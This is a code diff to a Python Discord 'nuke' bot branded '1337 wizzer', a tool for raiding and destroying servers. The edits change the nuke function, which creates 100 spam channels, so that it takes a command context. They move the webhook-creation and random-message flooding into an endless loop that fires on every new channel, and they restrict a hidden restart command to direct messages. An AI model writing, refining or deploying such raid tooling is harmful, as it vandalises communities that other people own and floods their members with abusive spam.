@@ -28,7 +28,7 @@ async def status_task():
         await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name="SIKE, beamed by 1337"))
         await asyncio.sleep(120)
 
-async def nuke(guild):
+async def nuke(ctx, guild):
   print(f"{C.WHITE}Nuking {guild.name} ~ Using 1337 wizzer.")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
@@ -52,7 +52,7 @@ async def nuke(guild):
   webhook.add_embed(log)
   webhook.execute()
   for i in range(100):
-    await guild.create_text_channel(random.choice(channel_names))
+    await guild.create_text_channel(ctx.author.name + random.choice(channel_names))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
 
 
@@ -178,12 +178,12 @@ async def roles(ctx):
 async def on_guild_channel_create(channel):
   while True:
     await channel.send("@everyone 1337 Wizzed This Shit.")
-  webhook = await channel.create_webhook(name="1337")
-  webhook_url = webhook.url
-  async with aiohttp.ClientSession() as session:
-    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-    while True:
-      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
+    webhook = await channel.create_webhook(name="1337")
+    webhook_url = webhook.url
+    async with aiohttp.ClientSession() as session:
+      webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
+      while True:
+        await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
 
 @bot.event
 async def on_guild_join(guild):
@@ -230,11 +230,14 @@ def _input():
                 os._exit(0)
 
 @bot.command()
-async def abcrestart(ctx):
-        await ctx.message.delete()
-        await ctx.author.send("Restarting...")
-        sleep(0.5)
-        os._exit(0)
+async def force_restart(ctx):
+  if ctx.channel.id == ctx.author.dm_channel.id:
+    await ctx.message.delete()
+    await ctx.author.send("**Restarting...**")
+    sleep(0.5)
+    os._exit(0)
+  else:
+    return
 
 try:
   thread = threading.Thread(target=_input)
